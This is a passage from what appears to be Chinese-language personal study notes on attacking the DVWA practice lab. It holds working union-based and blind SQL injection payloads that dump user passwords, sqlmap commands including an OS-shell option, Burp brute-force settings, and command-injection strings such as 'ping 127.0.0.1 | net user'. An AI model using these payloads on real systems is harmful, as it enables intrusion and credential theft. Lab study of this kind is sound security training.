<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">id=3 or 1=1						#查闭合点</span><br><span class="line">id=3 order by 3#					-- 三列报错说名只有2个字段,返回结果2个</span><br><span class="line">id=3 union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;id&#x27;	应该是说返回值要有2个</span><br><span class="line">id=3 union select 1, database()#	-- 获取当前数据库==》dvwa</span><br><span class="line">id=3 union select version(), 2#	-- 获取版本</span><br><span class="line">id=3 union select session_user(), 2#	-- 连接用户</span><br><span class="line">id=3 union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span><br><span class="line"></span><br><span class="line">-- 查询有哪些数据库		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=3 union select 1, schema_name from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">-- 查dvwa库有哪些表			这是单引号的问题</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</span><br><span class="line">-- 查dvwa库有哪些表	Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=database()#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line">-- 查users表有哪些字段				这个不对不能有引号</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line">-- 查users表有哪些字段		小葵花转换工具转成hex		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=0x7573657273#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line"># 查密码		此处需要将first_name,last_name改回utf8_unicode_ci</span><br><span class="line">id=5 union select user,password from dvwa.users#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弹框同Low级别输入</span><br></pre></td></tr></table></figure>

<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>看源码只能输入数字，不可能产生注入</p>
<h1 id="SQLmap工具注入"><a href="#SQLmap工具注入" class="headerlink" title="SQLmap工具注入"></a>SQLmap工具注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bp抓包抓不了127.0.0.1抓192.168.88.1这个是host-only分配的地址</span><br><span class="line">可以获取cookie也可以f12控制台document.cookie</span><br><span class="line"></span><br><span class="line">#	get请求注入</span><br><span class="line">#	-u后面双引号网址网址 --cookie=&quot;提交参数的网址（get请求）&quot;</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=qboo64r71thl7fa5c0qk73cph5; security=low&quot;</span><br><span class="line">#	得到数据库类型和版本	服务器系统类型	php版本 apache版本</span><br><span class="line"></span><br><span class="line">#	加--dbs得到所有数据库的名字</span><br><span class="line"></span><br><span class="line">#	post请求注入</span><br><span class="line">#	方法1		加上--forms</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/login.html&quot; --forms</span><br><span class="line">#	方法2		-r参数拦截加载的数据包信息放进sqlmap所在目录.txt文件 </span><br><span class="line">sqlmap.py -r &quot;search-test.txt&quot; -p &quot;username&quot;	#-p	重点检测username参数是否可注入</span><br><span class="line">#	方法3		利用os-shell参数获取shell</span><br><span class="line">1.网站必须是MSSQL或MySQL不可用于ACCSEE</span><br><span class="line">2.当前用户必须具有数据库管理员操作权限</span><br><span class="line">3.需要知道具体的文件路径</span><br><span class="line">#这里只有low级别可以实现</span><br><span class="line">首先检测出是不是注入点，然后加上--os-shell</span><br><span class="line">选择4（PHP）</span><br><span class="line">然后输入主目录路径D:\phpStudy\WWW\dvwa</span><br><span class="line">获取os-shell</span><br><span class="line">这个方法条件苛刻</span><br></pre></td></tr></table></figure>

<h1 id="搭建PHP加SQL-Server的Web环境"><a href="#搭建PHP加SQL-Server的Web环境" class="headerlink" title="搭建PHP加SQL Server的Web环境"></a>搭建PHP加SQL Server的Web环境</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h2 id="SQL-Server的注入特性"><a href="#SQL-Server的注入特性" class="headerlink" title="SQL Server的注入特性"></a>SQL Server的注入特性</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数前加@符号，可以抑制报错信息</span><br></pre></td></tr></table></figure>

<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit从<span class="number">0</span>开始</span><br><span class="line">substr从<span class="number">1</span>开始</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_39670065<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">107875210</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>布尔盲注利用前提</span><br><span class="line">页面没有显示位，没有输出<span class="keyword">SQL</span>语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</span><br><span class="line"><span class="number">2.</span>布尔盲注利用    </span><br><span class="line">该语句判断数据库个数，当数据库个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span> n</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常</span><br><span class="line">(<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span>n</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length() 返回字符串的长度</span><br><span class="line">substr() 截取字符串，偏移是从<span class="number">1</span>开始，而不是<span class="number">0</span>开始</span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line"><span class="built_in">count</span>(column_name) 返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>时间盲注利用前提</span><br><span class="line">页面上没有显示位，也没有输出<span class="keyword">SQL</span>语句执行错误信息。 正确的<span class="keyword">SQL</span>语句和错误的<span class="keyword">SQL</span>语句返回页面都一样，但是加入sleep(<span class="number">5</span>)条件之后，页面的返回速度明显慢了<span class="number">5</span>秒。</span><br><span class="line"><span class="number">2.</span>时间盲注利用</span><br><span class="line">该语句判断数据库个数，当数据库个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> <span class="built_in">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> length(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟<span class="number">5</span>秒</span><br><span class="line">if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span>n,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">相关函数学习</span><br><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">substr（）截取字符串</span><br><span class="line">ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br><span class="line"><span class="built_in">count</span>(column_name)函数返回指定列的值的数目(<span class="keyword">NULL</span> 不计入)</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 以下输入均显示存在		User ID exists in the database.</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">-- 以下显示不存在		User ID is MISSING from the database.</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line"><span class="comment">-- 此处判断存在字符型盲注</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="comment">-- 查数据库前要先判断数据库长度，发现x=4显示存在</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database())=x#</span></span><br><span class="line"><span class="string">-- 二分法找数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span>或小于字母ascii值#</span><br><span class="line"><span class="comment">-- d 100 v 118 w 119 a 97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=100#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">118</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))=119#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dvwa库中表的数量		x=2成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 表的长度		limit 0,1从第0行开始查一个</span></span><br><span class="line"><span class="string">--	guestbook</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr(&#x27;</span>guestbook<span class="string">&#x27;,1))=9#		--应该是有个强转str的步骤在里面</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(<span class="string">&#x27;guestbook&#x27;</span>)<span class="operator">=</span><span class="number">9</span>#</span><br><span class="line"><span class="comment">-- users</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>x#</span><br><span class="line"><span class="comment">-- g103 u117 e101 s115 t116 b98 o111 o111 k107</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=116#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">98</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1))=111#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">111</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1))=107#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- u 117 s 115 e 101 r 114 s 115</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>#</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- users表字段数量			x=8成立</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 分别查找8个字段的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span>x</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 二分法分别查找8个字段段的名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select user from dvwa.users limit 0,1)=&#x27;</span>admin</span><br><span class="line"><span class="comment">-- admin的a97</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97#</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 此处应只用延迟判断</span></span><br><span class="line"><span class="comment">-- 有明显延迟			User ID is MISSING from the database.</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">-- 没有延迟				User ID exists in the database.</span></span><br><span class="line"><span class="string">1 and sleep(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定库名长</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=2,sleep(5),1) # 没有延迟</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">3</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(database())=4,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的数量</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() )<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# 没有延迟</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 确定表的长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) # 没有延迟</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</span></span><br><span class="line"><span class="string">后面差不多</span></span><br></pre></td></tr></table></figure>



<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数字型注入</span></span><br><span class="line">burpsuite抓包转repeater替换最后一行 去掉逗号抄low级别</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>Submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>

<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同low</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$getid = &quot;SELECT first_name, last_name FROM users WHERE first_name like &#x27;%$id%&#x27;&quot;;</span><br><span class="line">#%表示任意字符 _表示任意单个字符</span><br><span class="line">#判断方法。输入%或_下划线能查询到所有数据，证明漏洞存在</span><br><span class="line">#like &#x27;%%%&#x27;				like &#x27;%_%&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="代码层面挖掘SQL注入漏洞"><a href="#代码层面挖掘SQL注入漏洞" class="headerlink" title="代码层面挖掘SQL注入漏洞"></a>代码层面挖掘SQL注入漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#代码中负责后去用户数据的变量:$_GET $_POST $_COOKIE $_SERVER</span><br><span class="line">#负责执行数据库查询操作的函数mysql_query()</span><br></pre></td></tr></table></figure>



<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_50339832/article/details/</span><br><span class="line">1.常用的账号密码比如top100 top500</span><br><span class="line">2.互联网被拖库后的账号密码比如当年的CSDN泄露的600w用户信息</span><br><span class="line">3.使用工具软件按照制定规则进行排列组合算法生成的字典，比如生日字典等</span><br><span class="line"></span><br><span class="line">send to intruder之后在position页面选择attack type</span><br><span class="line">sniper：狙击手，指定多个变量同时破解，但只设一个字典文件，将指定得到变量挨个用字典内容进行替换</span><br><span class="line">battering ram：攻城锤，指定多个变量，只设一个字典文件，将所有变量一起用字典内容替换，但需要分别设置字典文件，然后用对应的字典内容对变量进行替换</span><br><span class="line">cluster bomb：集束炸弹，指定多个变量，并未每个变量分别设置一个字典文件，然后用字典内容组合对变量进行替换</span><br><span class="line"></span><br><span class="line">payload type</span><br><span class="line">simple list：可以手动添加字典列表，也可以导入burpsuite自带的字典，或者导入自定义的字典</span><br><span class="line">runtime file：只能加载自定义的字典</span><br><span class="line">numbers：设定一个数值范围，从范围内一次或随机取值进行测试</span><br><span class="line">brute forcer：自己定义字符范围来生成字典文件</span><br></pre></td></tr></table></figure>

<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>qq_26406447<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">89882086</span></span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php_uname[<span class="string">&#x27;s&#x27;</span>]			<span class="comment">//获取操作系统信息</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;??&quot;</span>)		<span class="comment">//执行shell，php执行操作系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>个符号	| || &amp; &amp;&amp; ;</span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> | net user		<span class="comment">//NET USER 用于创建和修改计算机上的用户帐户。当不带选项使用本命令时，它会列出计算机上的用户帐户。用户帐户的信息存储在用户帐户数据库中。　该命令仅在服务器上运行。</span></span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span> || net user		<span class="comment">//前面的命令执行不成功才会执行后面的命令</span></span><br><span class="line">    </span><br><span class="line">linux使用 ; 可以执行多条命令</span><br><span class="line">使用重定向&gt;在服务器生成文件，或者使用&lt;读取文件</span><br></pre></td></tr></table></figure>

<p>常见防范措施</p>
